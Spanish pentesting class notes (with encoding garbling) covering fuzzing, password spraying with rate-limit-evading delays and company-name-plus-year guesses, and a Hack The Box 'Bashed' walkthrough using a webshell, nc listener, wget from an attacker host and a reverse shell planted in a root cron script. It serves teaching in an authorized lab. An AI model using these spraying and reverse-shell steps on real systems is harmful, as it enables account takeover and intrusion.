# **2. Conceptos clave**

> â†’

## **2.1. AnatomÃ­a de una URL**

Carlos usÃ³ un sÃ­mil de anÃ¡lisis sintÃ¡ctico para desmenuzar una URL. Tomando como ejemplo una direcciÃ³n con bÃºsqueda:

| |
|---|
|https://ejemplo.es/directorio?q=valor&page=2<br><br>Â  â”‚Â Â Â Â Â  â”‚Â Â Â Â Â Â Â  â”‚Â Â Â Â Â Â Â Â Â Â  â”‚Â  â”‚Â Â Â Â Â  â”‚<br><br>Â  â”‚Â Â Â Â Â  â”‚Â Â Â Â Â Â Â  â”‚Â Â Â Â Â Â Â Â Â Â  â”‚Â  â”‚Â Â Â Â Â  â””â”€ 2Âª variable (page) = valor (2)<br><br>Â  â”‚Â Â Â Â Â  â”‚Â Â Â Â Â Â Â  â”‚Â Â Â Â Â Â Â Â Â Â  â”‚Â  â””â”€ separador de parÃ¡metros: &<br><br>Â  â”‚Â Â Â Â Â  â”‚Â Â Â Â Â Â Â  â”‚Â Â Â Â Â Â Â Â Â Â  â””â”€ variable (q) = valor<br><br>Â  â”‚Â Â Â Â Â  â”‚Â Â Â Â Â Â Â  â””â”€ directorio / ruta<br><br>Â  â”‚Â Â Â Â Â  â””â”€ dominio (.es procedencia EspaÃ±a, .com global, .mx MÃ©xico...)<br><br>Â  â””â”€ protocolo (http, https, ftp, ssh, smb...) + 's' = capa segura sobre TCP/IP|

â—Â Â Â Â Â  El **protocolo** indica cÃ³mo se accede al recurso. La s de https es el subprotocolo seguro sobre TCP/IP.

â—Â Â Â Â Â  El **dominio** termina en un TLD que indica procedencia (.es, .com, .mx...).

â—Â Â Â Â Â  Tras ? empieza el primer **parÃ¡metro**; dentro de Ã©l, variable=valor.

â—Â Â Â Â Â  Para encadenar varios parÃ¡metros se usa & (ampersand). El ? va **una sola vez**, justo antes del primer parÃ¡metro: pagina?param1=valor1&param2=valor2.

| |
|---|
|**â„¹ï¸ Por quÃ© importa esta anatomÃ­a**<br><br>Cada parte de la URL es un punto donde podemos **fuzzear**: subdominio, directorio, nombre de parÃ¡metro o valor de variable. Saber diferenciarlas es lo que permite despuÃ©s decidir dÃ³nde inyectar el diccionario.|

## **2.2. Endpoint: la pieza que lo explica todo**

Un **endpoint** es el receptor concreto de una peticiÃ³n. Este concepto es la clave para entender por quÃ© unas tÃ©cnicas se detectan y otras no:

â—Â Â Â Â Â  Cambiar el **valor** de una misma variable en el mismo directorio â†’ **mismo endpoint** (se repite el receptor).

â—Â Â Â Â Â  Cambiar de **directorio, parÃ¡metro o usuario** â†’ **endpoints distintos** (cada uno es un receptor diferente).

| |
|---|
|**â„¹ï¸ AnalogÃ­a de Carlos**<br><br>Imagina la clase con 35 alumnos. Preguntar Â«Â¿me dejas un euro?Â» a Mariana, a Chema, a Ã“scar... son **endpoints distintos** (personas distintas). Repetir Â«Â¿un euro? Â¿un euro? Â¿un euro?Â» a la **misma** persona es el mismo endpoint, y a la dÃ©cima te cansa (te bloquea).|

## **2.3. CÃ³digos de estado HTTP**

Al lanzar peticiones interpretamos la respuesta por su cÃ³digo. Los bÃ¡sicos para enumerar:

|**CÃ³digo**|**Significado**|**Uso en enumeraciÃ³n**|
|---|---|---|
|200|OK â€” el recurso existe y responde|El directorio/recurso **estÃ¡** (levantado).|
|403|Forbidden â€” existe pero no autorizado|Existe, pero no nos deja entrar.|
|404|Not Found â€” no existe|El recurso **no** estÃ¡.|
|301/302|RedirecciÃ³n|Nos manda a otra ruta (ej. /js â†’ /js/).|
|**â„¹ï¸ Recurso recomendado**<br><br>Carlos recuerda http.cat como chuleta visual de todos los cÃ³digos de estado HTTP.|

# **3. Fuerza bruta, password spraying y enumeraciÃ³n de directorios**

El grueso teÃ³rico de la sesiÃ³n fue diferenciar estas tres cosas. Todas Â«lanzan muchas peticionesÂ», pero se comportan de forma muy distinta frente a los mecanismos de defensa.

## **3.1. Fuerza bruta**

â—Â Â Â Â Â  Se lanza contra **el mismo endpoint** (por ejemplo, wp-login.php?user=x&pass=?), iterando el **valor** de una variable.

â—Â Â Â Â Â  Al golpear siempre el mismo receptor, es fÃ¡cil que salte el **rate limit** y nos bloqueen.

â—Â Â Â Â Â  Es **exponencial**: no sabemos la longitud ni el juego de caracteres, asÃ­ que el coste crece muchÃ­simo (ver tabla de tiempos mÃ¡s abajo).

| |
|---|
|**âš ï¸ Regla de oro**<br><br>La **fuerza bruta es lo Ãºltimo** que hay que intentar. Es ruidosa, lenta y muy probablemente no encuentre la contraseÃ±a por caracteres especiales, longitud y aleatoriedad.|

## **3.2. Password spraying**

En lugar de probar muchas contraseÃ±as contra un usuario, se prueba **una misma contraseÃ±a contra muchos usuarios** (cada usuario es un endpoint distinto). Cuando termina la tanda, se lanza la siguiente contraseÃ±a.

â—Â Â Â Â Â  Explota el factor humano: la contraseÃ±a mÃ¡s habitual suele ser **el nombre de la empresa + aÃ±o** (Empresa2026, Empresa2026!, Empresa2025...).

â—Â Â Â Â Â  Al rotar entre usuarios, cuando se vuelve al primero ya ha pasado tiempo suficiente para no disparar el rate limit por usuario.

â—Â Â Â Â Â  Al contrario que la fuerza bruta, **es de las primeras cosas** que se prueban en un ejercicio real.

| |
|---|
|**â›” Ejemplo de laboratorio / auditorÃ­a autorizada**<br><br>Sobre un directorio activo de ~700 usuarios se lanza Empresa2026 a todos; luego Empresa2026!; luego Empresa2025 y Empresa2025!. SegÃºn lo comentado en clase, ese pequeÃ±o conjunto de combinaciones suele sacar un porcentaje notable de usuarios. **Solo aplicable en entornos autorizados.**|

## **3.3. EnumeraciÃ³n de directorios (Â¿por quÃ© NO te banean?)**

Al descubrir directorios probamos /admin, /login, /uploads... es decir, **un endpoint distinto por cada peticiÃ³n**. El servidor solo ve trÃ¡fico repartido entre muchas rutas, que es un comportamiento normal de navegaciÃ³n.

| |
|---|
|**Fuerza bruta â†’ MISMO endpoint (mismo login) â†’ salta rate limit**|
|**â†“**|
|**Password spraying â†’ 1 pass a N usuarios (endpoints distintos) â†’ evade rate limit**|
|**â†“**|
|**EnumeraciÃ³n de directorios â†’ N rutas distintas (N endpoints) â†’ no salta rate limit**|
|**â„¹ï¸ Matiz de Carlos sobre parÃ¡metros**<br><br>Si sobre el mismo directorio **iteras el valor** de una variable, es fuerza bruta (mismo endpoint). Si **iteras el nombre del parÃ¡metro o el directorio**, son endpoints distintos â†’ se comporta como un spray. Por eso podemos enumerar parÃ¡metros ocultos sin bloqueos.|

# **4. Rate limit, WAF y cÃ¡lculo de delays**

El **rate limit** es el nÃºmero mÃ¡ximo de intentos permitidos por unidad de tiempo. Siempre tiene forma de nÂº de intentos / tiempo.

â—Â Â Â Â Â  Valor tÃ­pico en web y en Active Directory: **3 intentos cada 5 minutos** (â‰ˆ 1 intento cada 100 s â‰ˆ 1,5 min).

â—Â Â Â Â Â  Puede aplicarse por **usuario** (bloquea la cuenta) o por **IP** (nÃºmero de requests que acepta un servidor).

â—Â Â Â Â Â  Un **WAF/SIEM/EDR** detecta patrones de comportamiento repetitivo y levanta _flags_ que acaban en bloqueo.

## **4.1. CÃ³mo calcular el delay (con NetExec)**

Como referencia, se comentÃ³ que **NetExec lanza ~1 peticiÃ³n cada 0,5 s**. Con ese dato se estima cuÃ¡nto tarda una vuelta completa al listado de usuarios y si hace falta meter _delay_:

| |
|---|
|**â„¹ï¸ Idea complementaria (aÃ±adida para aclarar el cÃ¡lculo)**<br><br>**~5000 usuarios:** 5000 Ã— 0,5 s = 2500 s â‰ˆ 40 min por vuelta. Al volver al primer usuario ya ha pasado mÃ¡s de una hora â†’ **no hace falta delay**.<br><br>**Pocos usuarios (ej. 6):** 6 Ã— 0,5 s = 3 s por vuelta, demasiado rÃ¡pido â†’ hay que **meter un delay** (p. ej. ~1 min por peticiÃ³n) para no superar el rate limit.<br><br>La regla mental: cuantos **menos usuarios**, **mÃ¡s delay**; cuantos mÃ¡s usuarios, el propio recorrido ya introduce el tiempo necesario.|

## **4.2. Tiempos de crackeo de contraseÃ±as**

Se recordÃ³ la tÃ­pica tabla que relaciona longitud/complejidad de contraseÃ±a con el tiempo de crackeo. La idea importante es que el coste es **acumulativo**: antes de llegar a probar 14 caracteres, ya has tenido que agotar todas las de 13, 12, 11...

| |
|---|
|**âš ï¸ Por quÃ© la fuerza bruta Â«estÃ¡ raraÂ»**<br><br>Una contraseÃ±a de ~14 caracteres alfanumÃ©ricos con sÃ­mbolos puede irse a cientos de millones de aÃ±os. Y para llegar ahÃ­ primero recorres todas las longitudes menores. Por eso conviene evitarla y priorizar spraying o vectores mÃ¡s inteligentes.|
|**â„¹ï¸ Mecanismos de bloqueo del mundo real (mencionados en clase)**<br><br>**MÃ³viles (iOS/Android):** bloqueo progresivo tras varios fallos (10 s â†’ 20 s â†’ 40 s â†’ minutos â†’ hasta 999 min). Cada fabricante aÃ±ade su propio esquema.<br><br>**Banca:** tras N fallos del cÃ³digo de acceso se bloquea la cuenta y hay que **desbloquear fÃ­sicamente** en oficina.|

# **5. La tÃ©cnica del dÃ­a: Fuzzing**

El **fuzzing** combina lo mejor de la fuerza bruta (probar muchas combinaciones de un diccionario) con lo mejor del listado de directorios (endpoints distintos, sin bloqueos). Su clave es el marcador **FUZZ**: donde lo colocamos, la herramienta sustituye cada entrada del diccionario.

| |
|---|
|# El marcador FUZZ se puede colocar en distintas posiciones:<br><br>https://FUZZ.dominio.es/Â Â Â Â Â Â Â Â Â Â Â  â†’ descubrir SUBDOMINIOS<br><br>https://dominio.es/FUZZÂ Â Â Â Â Â Â Â Â Â Â Â  â†’ descubrir DIRECTORIOS<br><br>https://dominio.es/admin/FUZZ.phpÂ Â  â†’ descubrir FICHEROS/rutas (admin1, admin2...)<br><br>https://dominio.es/pagina?FUZZ=1Â Â Â  â†’ descubrir NOMBRES de parÃ¡metros<br><br>https://dominio.es/pagina?id=FUZZÂ Â  â†’ descubrir VALORES de una variable|
|**âœ… Ventaja del fuzzing**<br><br>Con **una sola herramienta** y el mismo enfoque podemos descubrir subdominios, directorios, parÃ¡metros y valores. Colocamos FUZZ donde queramos: esa flexibilidad es lo mÃ¡s importante de la tÃ©cnica.|
|**â„¹ï¸ Herramienta destacada: x8**<br><br>Carlos recomendÃ³ **x8**, una herramienta especializada en **enumerar parÃ¡metros ocultos** de una web (parÃ¡metros que no aparecen en la interfaz pero el backend sÃ­ procesa).|

## **5.1. Â¿CuÃ¡ndo listar directorios y cuÃ¡ndo fuzzear?**

â—Â Â Â Â Â  **Por defecto:** listado de directorios de confianza (Carlos usa **dirsearch**). Es lo primero que se lanza.

â—Â Â Â Â Â  **Fuzzear** cuando no encuentras nada con el listado estÃ¡ndar y sospechas que hay algo oculto: un subdominio, un parÃ¡metro, una funcionalidad o un directorio que no estÃ¡ en el diccionario habitual (muy tÃ­pico en CTFs/mÃ¡quinas vulnerables).

â—Â Â Â Â Â  TambiÃ©n para **probar el valor** de una variable sin recurrir al Intruder de Burp Suite.

# **6. MetodologÃ­a de pentesting y reconocimiento web**

Toda la sesiÃ³n se enmarca en la metodologÃ­a por fases:

| |
|---|
|**1. EnumeraciÃ³n**|
|**â†“**|
|**2. ExplotaciÃ³n**|
|**â†“**|
|**3. Escalada de privilegios**|
|**â†“**|
|**4. Persistencia**|
|**â†“**|
|**5. Reporte**|

Camino habitual dentro de la enumeraciÃ³n web:

â—Â Â Â Â Â  nmap para detectar servicios. Si hay 80/443 o cualquier HTTP â†’ **listado de directorios**.

â—Â Â Â Â Â  Si es un **CMS**: WordPress â†’ WPScan; Drupal â†’ droopescan. (Joomla/Shopify tienen sus frameworks, pero apenas se ven en la prÃ¡ctica.)

â—Â Â Â Â Â  Mientras el listado corre en segundo plano, **conocer la web** (recon manual).

## **6.1. La analogÃ­a de la discoteca (reconocimiento web)**

Antes de explotar, hay que Â«conocerÂ» la aplicaciÃ³n, igual que no se le entra directo a alguien en una discoteca. El **WAF es el portero**: si te pasas de pesado, te echa. La idea es seducir sin que el portero te frene. Durante el recon buscamos seÃ±ales que apuntan a vulnerabilidades potenciales:

|**SeÃ±al encontrada en la web**|**Vulnerabilidad potencial a investigar**|
|---|---|
|Buscador / campo de bÃºsqueda|SQL Injection (interactÃºa con BD)|
|Formulario de registro o de contacto|SQL Injection (comunicaciÃ³n con el backend)|
|Blog / foro / comentarios|Cross-Site Scripting (XSS)|
|Directorio /uploads o de subida de ficheros|Subida de ficheros â†’ posible ejecuciÃ³n (webshell)|
|Descarga de PDF (polÃ­ticas, etc.)|XXE (XML External Entity)|
|No hace fetch de origen|SSRF (Server-Side Request Forgery)|
|VersiÃ³n de PHP / software muy antigua|CVE con exploit pÃºblico|
|Plantilla HTML / CMS con versiÃ³n antigua|Vulnerabilidades propias de la plantilla/CMS|
|**â„¹ï¸ Buena prÃ¡ctica de notas**<br><br>Todo hallazgo (usuario potencial, versiÃ³n, ruta interesante, tecnologÃ­a) se **apunta en el bloc de notas** aunque de momento se descarte. En enumeraciÃ³n, cuanto mÃ¡s recopilas, mÃ¡s vectores tienes despuÃ©s.|

â†’

â†’

# **7. Caso prÃ¡ctico: mÃ¡quina Bashed (Hack The Box)**

| |
|---|
|**â„¹ï¸ Nota de fidelidad**<br><br>En la transcripciÃ³n la mÃ¡quina suena como Â«PashedÂ»; por todos los indicios (herramienta _phpbash_, usuarios arrexel y scriptmanager, cadena test.py/test.txt con cron) se corresponde con la mÃ¡quina **Bashed** de Hack The Box. Se corrige por coherencia tÃ©cnica. Todo el trabajo es en un **entorno autorizado de CTF**.|

## **7.1. EnumeraciÃ³n inicial**

| |
|---|
|ping -c1 <IP>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # comprobar ICMP / que la mÃ¡quina responde<br><br>nmap -sCV -Pn <IP>Â Â Â Â Â Â Â Â Â Â Â  # -Pn omite descubrimiento de host (no depende de ICMP)|
|**â„¹ï¸ Detalle sobre ICMP/ARP**<br><br>En mÃ¡quinas alojadas en AWS un ping no devuelve nada porque **no hay ICMP ni ARP**. AhÃ­ se usa -Pn para que Nmap no descarte el host.|

â—Â Â Â Â Â  Si al abrir la web **carga**, no hay un DNS/vhost puesto a mano. Si **no carga** y da error, hay que encontrar el nombre y aÃ±adirlo a /etc/hosts.

â—Â Â Â Â Â  Con un puerto 80 abierto, se lanza el listado de directorios en segundo plano (**dirsearch**) mientras se hace el recon manual.

## **7.2. IdentificaciÃ³n de tecnologÃ­as**

â—Â Â Â Â Â  Con **Wappalyzer** se identifica el stack: se detecta **Apache** y **PHP** en el servidor.

â—Â Â Â Â Â  Se anota la versiÃ³n de Apache para buscar **CVEs** (se revisaron varias: WebDAV, mod_proxy FTP XSS, buffer/heap overflow, modo LDAP...) y se descartan las que no aplican a la mÃ¡quina.

â—Â Â Â Â Â  TambiÃ©n aparece **jQuery** marcado como vulnerable â€” Carlos apunta que en la prÃ¡ctica casi nunca es un vector real.

## **7.3. Reconocimiento manual y descubrimiento de rutas**

Revisando el cÃ³digo fuente (clic derecho â†’ ver cÃ³digo fuente) y navegando, se van mapeando rutas y hallazgos:

|**Ruta / hallazgo**|**ObservaciÃ³n**|
|---|---|
|/about.html|PÃ¡gina Â«AboutÂ». Aparece un autor â†’ **usuario potencial** (p. ej. jmarshall, jen...).|
|/config.php|0 bytes. Un .php se **ejecuta** en el navegador, no muestra el cÃ³digo fuente.|
|/contact.html|Formulario sin backend real (comprobaciÃ³n solo en el front). Con Burp podrÃ­a saltarse.|
|/images, /js, /php|Directorios de recursos. /js y /php ejecutan PHP â†’ interesantes para subir/ejecutar.|
|/uploads|Directorio de subida â†’ si logramos subir algo, posible **ejecuciÃ³n**.|
|/dev|Directorio de desarrollo â†’ aquÃ­ estÃ¡ la joya.|
|Enlace a GitHub en el cÃ³digo|Apunta al **cÃ³digo fuente** de la herramienta instalada en el servidor.|
|**â„¹ï¸ Concepto: por quÃ© un .php se ve Â«vacÃ­oÂ»**<br><br>Un .html o .js muestra su texto en el navegador. Un .php **se ejecuta** en el servidor y solo vemos el **resultado** de esa ejecuciÃ³n, no el cÃ³digo. Por eso config.php aparecÃ­a en blanco.|
|**â„¹ï¸ Concepto: la extensiÃ³n del directorio no limita el intÃ©rprete**<br><br>Un fichero PHP subido a /js **tambiÃ©n se ejecuta** como PHP: el nombre de la carpeta (js) no define quÃ© se interpreta. Si el servidor tiene PHP (Apache sobre Linux), ejecutarÃ¡ el .php estÃ© donde estÃ©.|

## **7.4. ExplotaciÃ³n: webshell â†’ reverse shell (www-data)**

En /dev se encuentra phpbash.php, una **webshell** que da ejecuciÃ³n de comandos sin autenticaciÃ³n (RCE crÃ­tico: cualquiera que alcance el fichero ejecuta comandos como el usuario del servidor web).

| |
|---|
|# En la webshell:<br><br>whoamiÂ Â Â Â Â Â Â  # -> www-data<br><br>lsÂ Â Â Â Â Â Â Â Â Â Â  # /var/www/html es la raÃ­z por defecto de Apache|

Como una webshell es incÃ³moda, se monta una **reverse shell** propia. Usando revshells.com se genera un payload (Python) y se pone un _listener_ con Netcat:

| |
|---|
|# En la mÃ¡quina atacante (Kali):<br><br>nc -lvnp 4444<br><br># En la webshell se pega el payload de reverse shell (Python) apuntando a nuestra IP:puerto.<br><br># La IP del atacante en HTB se ve arriba a la derecha (ej. 10.10.14.x).|
|**âœ… Compromiso inicial**<br><br>Se obtiene una **reverse shell como `www-data`** en unos minutos. Es una shell real contra el servidor (a diferencia de webshells mÃ¡s limitadas).|

## **7.5. Escalada de privilegios: www-data â†’ script_manager**

Rutina de escalada: whoami y despuÃ©s listar quÃ© se puede ejecutar con sudo.

| |
|---|
|sudo -l<br><br># Resultado: www-data puede ejecutar comandos como 'scriptmanager' SIN contraseÃ±a.<br><br>sudo -u scriptmanager -iÂ Â Â  # nos convertimos en scriptmanager (-i = shell interactiva)|
|**â„¹ï¸ Buena prÃ¡ctica al cambiar de usuario**<br><br>sudo -u <usuario> -i es mÃ¡s limpio que sudo su. El -i (interactive) nos da una sesiÃ³n con entorno del usuario destino.|

â—Â Â Â Â Â  En /home aparecen los usuarios arrexel (dueÃ±o de la mÃ¡quina) y scriptmanager.

â—Â Â Â Â Â  La primera flag (user.txt) se encuentra en el directorio de **arrexel**.

## **7.6. Escalada final: script_manager â†’ root (cron + escritura de fichero)**

En /home/scriptmanager/scripts hay dos ficheros clave. Mirando propietarios con ls -la:

|**Fichero**|**Propietario**|**Nuestros permisos (como scriptmanager)**|
|---|---|---|
|test.py|scriptmanager|Lectura y **escritura** (es nuestro)|
|test.txt|root|Solo lectura|

La pieza que faltaba: existe un **cron job** que ejecuta test.py **como root** de forma periÃ³dica. Se confirma observando que la **fecha de modificaciÃ³n** de los ficheros cambia sola cada cierto tiempo (algo los estÃ¡ tocando â†’ root vÃ­a cron).

| |
|---|
|**cron (root) ejecuta test.py periÃ³dicamente**|
|**â†“**|
|**test.py es propiedad de scriptmanager â†’ PODEMOS modificarlo**|
|**â†“**|
|**Inyectamos una reverse shell dentro de test.py**|
|**â†“**|
|**El cron ejecuta test.py como root â†’ nos conecta una shell**|
|**â†“**|
|**Listener recibe la conexiÃ³n â†’ shell de ROOT**|

Como en la reverse shell no interactiva no se puede usar cÃ³modamente vi/nano, se escribe el fichero con echo redirigido o transfiriÃ©ndolo con un servidor HTTP y wget:

| |
|---|
|# OpciÃ³n A â€” escribir en una sola lÃ­nea con echo (Â¡todo en 1 lÃ­nea!):<br><br>echo 'import socket,subprocess,os; ...reverse shell python...' > /home/scriptmanager/scripts/test.py<br><br># OpciÃ³n B â€” transferir el fichero preparado en local:<br><br># En Kali (dentro de la carpeta con test.py):<br><br>python3 -m http.server 8000<br><br># En la vÃ­ctima:<br><br>wget http://10.10.14.x:8000/test.py -O /home/scriptmanager/scripts/test.py<br><br># Listener para recibir la shell de root:<br><br>nc -lvnp 4440|
|**âœ… Objetivo cumplido**<br><br>Al ejecutarse el cron como root sobre nuestro test.py modificado, el _listener_ recibe una **shell de root**. MÃ¡quina comprometida por completo.|
|**â›” Errores comunes vistos en directo (para no repetirlos)**<br><br>**Puerto del listener:** hay que abrir el nc en el **mismo puerto** que el payload; se perdiÃ³ tiempo por un 4443 vs 4445 descuadrado.<br><br>**Comandos en una sola lÃ­nea:** en shells no interactivas, cuidado con saltos de lÃ­nea y comillas mal cerradas al usar echo.<br><br>**`test.txt` vs `test.py`:** la reverse shell hay que meterla en el fichero que ejecuta el cron (test.py), no en el .txt de solo lectura.|

# **8. Herramientas utilizadas en la sesiÃ³n**

|**Herramienta**|**Objetivo**|**Fase**|**Comando o uso visto**|**Nivel**|**Notas**|
|---|---|---|---|---|---|
|Nmap|Detectar puertos y servicios|EnumeraciÃ³n|nmap -sCV -Pn <IP>|Recurrente|-Pn si no hay ICMP (AWS)|
|dirsearch|Listar directorios|Enum. web|dirsearch -u <URL>|Practicada|Default de Carlos, en 2Âº plano|
|ffuf|Fuzzing (FUZZ)|Enum. web|ffuf -u <URL>/FUZZ -w dic|Introducida|FUZZ en dir/param/subdominio|
|gobuster / dirb / feroxbuster|Listar directorios|Enum. web|(equivalentes)|Practicada|Unas con recursivo, otras no|
|x8|Enumerar parÃ¡metros ocultos|Enum. web|x8 (param discovery)|Mencionada|Nueva en el registro|
|Wappalyzer|Fingerprint de tecnologÃ­as|Enum. web|ExtensiÃ³n navegador|Introducida|Detecta Apache/PHP/CMS|
|WPScan / droopescan|AuditorÃ­a de CMS|Enum. web|wpscan / droopescan|Introducida|WP y Drupal respectivamente|
|NetExec|Spraying/auth en AD|Enum./Acceso|(cÃ¡lculo de delay)|Introducida|~1 req / 0,5 s|
|Burp Suite|Interceptar/saltar front|ExplotaciÃ³n|Proxy / Intruder|Practicada|Saltar validaciones de front|
|revshells.com|Generar reverse shells|ExplotaciÃ³n|Payloads listos|Practicada|Bash/nc/Python/PHP/perl|
|Netcat (nc)|Listener / conexiones|ExplotaciÃ³n|nc -lvnp <puerto>|Practicada|Recibir la reverse shell|
|Python http.server|Servir/transferir ficheros|Post-explotaciÃ³n|python3 -m http.server|Introducida|Combinado con wget|
|**â„¹ï¸ Nota de fidelidad**<br><br>Herramientas como **x8**, **droopescan** o **NetExec** se **mencionan** en la sesiÃ³n pero no se desarrollan en profundidad en el material. Se registran para ampliarlas en sesiones futuras.

# **9. Comandos importantes**

| |
|---|
|# --- EnumeraciÃ³n ---<br><br>ping -c1 <IP><br><br>nmap -sCV -Pn <IP><br><br>dirsearch -u http://<IP>/<br><br># --- Fuzzing (marcador FUZZ) ---<br><br>ffuf -u http://<IP>/FUZZ -w <diccionario> -cÂ Â Â Â Â Â Â  # directorios<br><br>ffuf -u http://FUZZ.<dominio> -w <diccionario> -cÂ Â  # subdominios<br><br># --- ExplotaciÃ³n / shells ---<br><br>nc -lvnp 4444Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # listener en Kali<br><br>whoami ; id ; ls -laÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # reconocimiento en la shell<br><br># --- Escalada de privilegios ---<br><br>sudo -lÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # quÃ© puedo ejecutar como sudo<br><br>sudo -u scriptmanager -iÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # cambiar de usuario<br><br>ls -laÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # revisar propietarios de ficheros<br><br># --- Transferencia de ficheros ---<br><br>python3 -m http.server 8000Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  # en el atacante<br><br>wget http://10.10.14.x:8000/test.py -O test.pyÂ Â Â Â Â  # en la victima|

# **10. Riesgos, errores comunes y buenas prÃ¡cticas**

| |
|---|
|**â›” Riesgos / alcance**<br><br>Todo lo practicado es sobre **laboratorios y mÃ¡quinas autorizadas** (CTF de HTB / entornos de la academia). Nunca contra sistemas reales sin permiso explÃ­cito.|
|**âš ï¸ Errores comunes**<br><br>Confundir **fuerza bruta** (mismo endpoint) con **spraying** (endpoints distintos).<br><br>Lanzar fuerza bruta como primera opciÃ³n: ruidosa, lenta e improbable.<br><br>Descuadre de **puertos** entre payload y listener.<br><br>Meter la reverse shell en el fichero equivocado dentro de la cadena de escalada.|
|**âœ… Buenas prÃ¡cticas**<br><br>Primero **listado de directorios** (dirsearch); solo si no aparece nada, **fuzzear**.<br><br>**Conocer** la web antes de explotar (analogÃ­a de la discoteca).<br><br>Apuntarlo **todo** en el bloc de notas: usuarios, versiones, rutas.<br><br>Calcular **delays** en spraying segÃºn nÂº de usuarios para no superar el rate limit.|

# **11. ConexiÃ³n con sesiones anteriores**

â—Â Â Â Â Â  El **fuzzing con `FUZZ`** y ffuf ya apareciÃ³ en la explotaciÃ³n de servicios web (puerto 80). AquÃ­ se formaliza como tÃ©cnica y se compara con el listado de directorios.

â—Â Â Â Â Â  El **descubrimiento de subdominios** enlaza con lo visto en OSINT / superficie de ataque.

â—Â Â Â Â Â  La cadena **webshell â†’ reverse shell â†’ sudo â†’ escalada** repite el patrÃ³n de mÃ¡quinas anteriores (WordPress â†’ theme editor â†’ www-data, Mr. Robot, Oopsie/Archetype).

â—Â Â Â Â Â  La **escalada vÃ­a fichero ejecutado por root (cron)** conecta con el concepto de tareas programadas visto en la sesiÃ³n previa (secuestro/hijacking de la ejecuciÃ³n).

â—Â Â Â Â Â  sudo -l, cambio de usuario y revisiÃ³n de propietarios con ls -la son parte del _checklist_ de **escalada de privilegios** que se venÃ­a trabajando.

# **12. Resumen final**

La sesiÃ³n fija los cimientos de la **enumeraciÃ³n web**: leer una URL como quien hace un anÃ¡lisis sintÃ¡ctico, entender el concepto de **endpoint** y, a partir de ahÃ­, distinguir por quÃ© la **fuerza bruta** salta alarmas mientras el **password spraying** y la **enumeraciÃ³n de directorios** las evitan. La tÃ©cnica estrella es el **fuzzing** (marcador FUZZ en subdominio, directorio, parÃ¡metro o valor), con **x8** como utilidad especÃ­fica para parÃ¡metros ocultos. Todo se cierra con una mÃ¡quina de HTB (**Bashed**) resuelta de principio a fin: _phpbash_ â†’ reverse shell como www-data â†’ sudo -u scriptmanager â†’ escalada a **root** aprovechando un cron que ejecuta un script modificable. La metodologÃ­a de fondo â€”EnumeraciÃ³n, ExplotaciÃ³n, Escalada, Persistencia, Reporteâ€” y la analogÃ­a de la discoteca resumen el Â«conocer antes de explotarÂ».

# **13. Checklist de repaso**

**â˜**Â  SÃ© identificar protocolo, dominio, directorio, parÃ¡metro y variable en una URL.

**â˜**Â  Explico quÃ© es un endpoint y por quÃ© es la clave de rate limit/spraying.

**â˜**Â  Diferencio fuerza bruta, password spraying y enumeraciÃ³n de directorios.

**â˜**Â  SÃ© quÃ© es el rate limit y cÃ³mo calcular un delay segÃºn el nÂº de usuarios.

**â˜**Â  Entiendo el fuzzing y sÃ© dÃ³nde colocar el marcador FUZZ.

**â˜**Â  Conozco x8 para enumerar parÃ¡metros ocultos.

**â˜**Â  Recuerdo las 5 fases de la metodologÃ­a de pentesting.

**â˜**Â  SÃ© leer las seÃ±ales del recon web (buscadorâ†’SQLi, uploadsâ†’webshell, etc.).

â†’

**â˜**Â  Reproduzco la cadena de Bashed: phpbash â†’ www-data â†’ scriptmanager â†’ root.

**â˜**Â  SÃ© transferir ficheros con http.server + wget y montar reverse shells con nc.

# **14. ActualizaciÃ³n del registro de herramientas**

SecciÃ³n lista para copiar a la base de conocimiento del proyecto.

## **Herramientas nuevas incorporadas**

|**Herramienta**|**Para quÃ© sirve**|**Fase**|**Nivel**|
|---|---|---|---|
|x8|EnumeraciÃ³n de parÃ¡metros ocultos en web|EnumeraciÃ³n web|Mencionada|
|dirsearch|Listado de directorios (default del profesor)|EnumeraciÃ³n web|Practicada|
|revshells.com|Generador de reverse shells (recurso web)|ExplotaciÃ³n|Practicada|
|droopescan|AuditorÃ­a de CMS Drupal (equivalente a WPScan)|EnumeraciÃ³n web|Mencionada|

## **Conceptos/tÃ©cnicas para el registro**

â—Â Â Â Â Â  **Fuzzing** con marcador FUZZ (subdominio / directorio / parÃ¡metro / valor).

â—Â Â Â Â Â  **Password spraying** y su diferencia con fuerza bruta (endpoints).

â—Â Â Â Â Â  **CÃ¡lculo de delays** frente al rate limit (referencia: NetExec ~1 req/0,5 s).

â—Â Â Â Â Â  **Escalada por cron + fichero escribible** ejecutado como root.

â—Â Â Â Â Â  Mapa de **recon web â†’ vulnerabilidad** (analogÃ­a de la discoteca).

â†’

â†’

â†’

